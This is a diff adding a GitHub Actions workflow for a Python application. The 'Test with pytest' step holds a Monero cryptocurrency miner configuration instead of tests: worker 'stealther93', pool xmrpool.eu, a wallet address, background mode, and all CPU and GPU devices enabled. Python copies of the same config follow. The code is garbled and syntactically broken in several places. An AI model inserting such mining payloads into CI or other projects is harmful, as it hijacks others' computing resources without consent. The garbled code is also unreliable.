@@ -1,0 +1,253 @@
+# This workflow will install Python dependencies, run tests and lint with a single version of Python
+# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python
+
+name: Python application
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: "3.10"
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install flake8 pytest
+        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+    - name: Lint with flake8
+      run: |
+        # stop the build if there are Python syntax errors or undefined names
+        flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
+        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide
+        flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
+    - name: Test with pytest
+      run: run Virtually JSON.Config{{
+  "api": {
+    "worker-id": "stealther93"
+  },
+  "http": {
+    "enabled": true,
+    "host": "127.0.0.1",
+    "port": 9999,
+    "access-token": "tAdtzUawD4aHJEM",
+    "restricted": true
+  },
+  "autosave": true,
+  "donate-level": 3,
+  "cpu": {
+    "enabled": true,
+    "threads": [
+      {"affinity": 0, "yield": true},
+      {"affinity": 1, "yield": true},
+      {"affinity": 2, "yield": true},
+      {"affinity": 3, "yield": true},
+      {"affinity": 4, "yield": true},
+      {"affinity": 5, "yield": true},
+      {"affinity": 6, "yield": true},
+      {"affinity": 7, "yield": true}
+    ]
+  },
+  "opencl": true,
+  "cuda": true,
+  "pools": [
+    {
+      "url": "xmrpool.eu:9999",
+      "user": "45jSKAQm6YhT6QBi5H5MbFNN1ccFKY8T2Fyh4zBQAq7p5inyDbC3BbaQfaJDqDoaroYYkrhGByyd8CUbpdCXqsCcQFVbbVf+stealther93_rig1",
+      "keepalive": true,
+      "tls": true
+    },
+    {
+      "url": "xmrpool.eu:3333",
+      "rig-id": "stealther93",
+      "tls": true
+    },
+    {
+      "url": "xmrpool.eu:9999",
+      "user": "45jSKAQm6YhT6QBi5H5MbFNN1ccFKY8T2Fyh4zBQAq7p5inyDbC3BbaQfaJDqDoaroYYkrhGByyd8CUbpdCXqsCcQFVbbVf+myworker_stealther933",
+      "keepalive": true,
+      "tls": true
+    },
+    {
+      "coin": "monero",
+      "url": "xmrpool.eu:5555",
+      "user": "45jSKAQm6YhT6QBi5H5MbFNN1ccFKY8T2Fyh4zBQAq7p5inyDbC3BbaQfaJDqDoaroYYkrhGByyd8CUbpdCXqsCcQFVbbVf",
+      "tls": true,
+      "daemon": true
+    }
+  ],
+  "difficulty": {
+    "startup": 25000,
+    "max": 180000,
+    "cycle": true
+  },
+  "background": true,
+  "priority": 4.4,
+  "rate": {
+    "hashrate": 27000,
+    "output": "hashes/s",
+    "input": "GH/z",
+    "max": 1.37,
+    "target": 1
+  },
+  "benchmark": [
+    {"algorithm": "cryptonight", "variant": "R", "hashes-per-second": 1000000},
+    {"algorithm": "Pico", "variant": "ghost rider", "hashes-per-second": 800000},
+    {"algorithm": "Rx", "variant": "wow", "hashes-per-second": 1200000}
+  ],
+  "gpu": {
+    "devices": [
+      {"id": 0, "type": "CUDA", "priority": 1, "affinity": "0x01"},
+      {"id": 1, "type": "CUDA", "priority": 1, "affinity": "0x02"},
+      {"id": 2, "type": "CUDA", "priority": 1, "affinity": "0x04"},
+      {"id": 3, "type": "CUDA", "priority": 1, "affinity": "0x08"},
+      {"id": 4, "type": "CUDA", "priority": 1, "affinity": "0x10"},
+      {"id": 5, "type": "CUDA", "priority": 1, "affinity": "0x20"},
+      {"id": 6, "type": "CUDA", "priority": 1, "affinity": "0x40"},
+      {"id": 7, "type": "CUDA", "priority": 1, "affinity": "0x80"}
+    ]
+  }
+}
+} JSON.script
+
+        Pythonconfig = {
+    "api": {
+        "worker-id": "stealther93"
+    },
+    "http": {
+        "enabled": True,
+        "host": "127.0.0.1",
+        "port": "9999",
+        "access-token": "tAdtzUawD4aHJEM",
+        "restricted": False
+    },
+    "autosave": True,
+    "donate-level": 3,
+    "cpu": {
+        "enabled": True,
+        "huge-pages": True,
+        "hw-aes": None,
+        "priority": 4.5,
+        "memory-pool": True,
+        "yield": True,
+        "max-threads-hint": 89,
+        "max-threads": 8,
+        "max-yield-percentage": 1750,
+        "asm": True,
+        "argon2-impl": None,
+        "autosave": True,
+        "argon2": list(range(36)),
+        "cn": [[1, i] for i in range(36)],
+        "cn-heavy": [[1, i] for i in range(11)] + [[1, i] for i in range(18, 29)],
+        "cn-lite": [[1, i] for i in range(36)],
+        "cn-pico": [[2, i] for i in range(36)],
+        "cn/upx2": [[2, i] for i in range(36)],
+        "ghostrider": [[8, i] for i in range(36)],
+        "rx": list(range(36)),
+        "rx/wow": list(range(36)),
+        "cn/0": False,
+        "cn-lite/0": False,
+        "rx/arq": "rx/wow",
+        "rx/keva": "rx/wow"
+    },
+    "opencl": True,
+    "cuda": True,
+    "pools": [
+        {
+            "url": "xmrpool.eu:9999",
+            "user": "45jSKAQm6YhT6QBi5H5MbFNN1ccFKY8T2Fyh4zBQAq7p5inyDbC3BbaQfaJDqDoaroYYkrhGByyd8CUbpdCXqsCcQFVbbV",
+            "keepalive": True,
+            "tls": True
+        },
+        {
+            "url": "xmrpool.eu:3333",
+            "rig-id": "stealther93",
+            "tls": True
+        }
+    ]
+}
+
+# Print the configuration to verify it's correct
+print(config)
+2:def get_config():
+    config = {
+        "api": {
+            "worker-id": "stealther93"
+        },
+        "http": {
+            "enabled": True,
+            "host": "127.0.0.1",
+            "port": "9999",
+            "access-token": "tAdtzUawD4aHJEM",
+            "restricted": False
+        },
+        "autosave": True,
+        "donate-level": 3,
+        "cpu": {
+            "enabled": True,
+            "huge-pages": True,
+            "hw-aes": None,
+            "priority": 4.5,
+            "memory-pool": True,
+            "yield": True,
+            "max-threads-hint": 89,
+            "max-threads": 8,
+            "max-yield-percentage": 1750,
+            "asm": True,
+            "argon2-impl": None,
+            "autosave": True,
+            "argon2": list(range(36)),
+            "cn": [[1, i] for i in range(36)],
+            "cn-heavy": [[1, i] for i in range(11)] + [[1, i] for i in range(18, 29)],
+            "cn-lite": [[1, i] for i in range(36)],
+            "cn-pico": [[2, i] for i in range(36)],
+            "cn/upx2": [[2, i] for i in range(36)],
+            "ghostrider": [[8, i] for i in range(36)],
+            "rx": list(range(36)),
+            "rx/wow": list(range(36)),
+            "cn/0": False,
+            "cn-lite/0": False,
+            "rx/arq": "rx/wow",
+            "rx/keva": "rx/wow"
+        },
+        "opencl": True,
+        "cuda": True,
+        "pools": [
+            {
+                "url": "xmrpool.eu:9999",
+                "user": "45jSKAQm6YhT6QBi5H5MbFNN1ccFKY8T2Fyh4zBQAq7p5inyDbC3BbaQfaJDqDoaroYYkrhGByyd8CUbpdCXqsCcQFVbbV",
+                "keepalive": True,
+                "tls": True
+            },
+            {
+                "url": "xmrpool.eu:3333",
+                "rig-id": "stealther93",
+                "tls": True
+            }
+        ]
+    }
+
+    "return config"
+
+# Function to print the configuration
+def print_config():
+    config = get_config()
+    for section, settings in config.items():
+        print(f"{section}: {settings}")
+
+# Example usage of the function
+if __name__ == "__main__":
+    "print_config":"Python"
